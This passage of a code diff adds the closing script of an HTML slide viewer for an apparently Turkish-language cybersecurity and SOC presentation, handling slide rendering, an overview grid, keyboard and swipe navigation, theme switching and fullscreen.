+            slideCard.offsetHeight;
+            slideCard.style.animation = 'slideIn 0.35s cubic-bezier(0.16, 1, 0.3, 1)';
+
+            slideTitle.textContent = slide.baslik || 'Başlıksız Slayt';
+            slideSubtitle.textContent = slide.altbaslik || '';
+            
+            let bodyHTML = formatContent(slide.icerik);
+            if (slide.gorsel && slide.gorsel.query) {
+                bodyHTML += `<div class="visual-box">🖼️ <strong>Görsel Analoji & Tematik Kavram:</strong> ${slide.gorsel.query}</div>`;
+            }
+            slideBody.innerHTML = bodyHTML;
+
+            slideMeta.textContent = `SLAYT ${currentIndex + 1} / ${slides.length} • Siber Güvenlik & SOC`;
+            slideCounter.textContent = `${currentIndex + 1} / ${slides.length}`;
+            
+            const pct = ((currentIndex + 1) / slides.length) * 100;
+            progressBar.style.width = `${pct}%`;
+
+            prevBtn.disabled = currentIndex === 0;
+            nextBtn.disabled = currentIndex === slides.length - 1;
+
+            updateOverviewActive();
+        }
+
+        function buildOverviewGrid() {
+            gridOverview.innerHTML = '';
+            slides.forEach((slide, idx) => {
+                const card = document.createElement('div');
+                card.className = `thumb-card ${idx === currentIndex ? 'active' : ''}`;
+                card.innerHTML = `
+                    <div class="thumb-num">Slayt ${idx + 1}</div>
+                    <div class="thumb-title">${slide.baslik || 'Başlıksız'}</div>
+                `;
+                card.onclick = () => {
+                    renderSlide(idx);
+                    overviewModal.classList.remove('active');
+                };
+                gridOverview.appendChild(card);
+            });
+        }
+
+        function updateOverviewActive() {
+            const cards = gridOverview.querySelectorAll('.thumb-card');
+            cards.forEach((c, idx) => {
+                if (idx === currentIndex) c.classList.add('active');
+                else c.classList.remove('active');
+            });
+        }
+
+        prevBtn.onclick = () => renderSlide(currentIndex - 1);
+        nextBtn.onclick = () => renderSlide(currentIndex + 1);
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === 'Space' || e.key === 'PageDown') {
+                e.preventDefault();
+                renderSlide(currentIndex + 1);
+            } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
+                e.preventDefault();
+                renderSlide(currentIndex - 1);
+            } else if (e.key === 'Home') {
+                e.preventDefault();
+                renderSlide(0);
+            } else if (e.key === 'End') {
+                e.preventDefault();
+                renderSlide(slides.length - 1);
+            } else if (e.key === 'f' || e.key === 'F') {
+                toggleFullscreen();
+            } else if (e.key === 'm' || e.key === 'M' || e.key === 'o' || e.key === 'O') {
+                toggleOverview();
+            } else if (e.key === 't' || e.key === 'T') {
+                toggleTheme();
+            }
+        });
+
+        function toggleOverview() {
+            buildOverviewGrid();
+            overviewModal.classList.toggle('active');
+        }
+
+        function toggleTheme() {
+            const current = document.documentElement.getAttribute('data-theme');
+            const next = current === 'dark' ? 'light' : 'dark';
+            document.documentElement.setAttribute('data-theme', next);
+            themeToggle.textContent = next === 'dark' ? '☀️' : '🌙';
+        }
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            } else {
+                document.exitFullscreen().catch(() => {});
+            }
+        }
+
+        overviewToggle.onclick = toggleOverview;
+        closeModal.onclick = () => overviewModal.classList.remove('active');
+        themeToggle.onclick = toggleTheme;
+        fullscreenToggle.onclick = toggleFullscreen;
+
+        let touchStartX = 0;
+        document.addEventListener('touchstart', e => touchStartX = e.changedTouches[0].screenX);
+        document.addEventListener('touchend', e => {
+            let touchEndX = e.changedTouches[0].screenX;
+            if (touchStartX - touchEndX > 50) renderSlide(currentIndex + 1);
+            if (touchEndX - touchStartX > 50) renderSlide(currentIndex - 1);
+        });
+
+        renderSlide(0);
+        buildOverviewGrid();
+    </script>
+</body>
+</html>
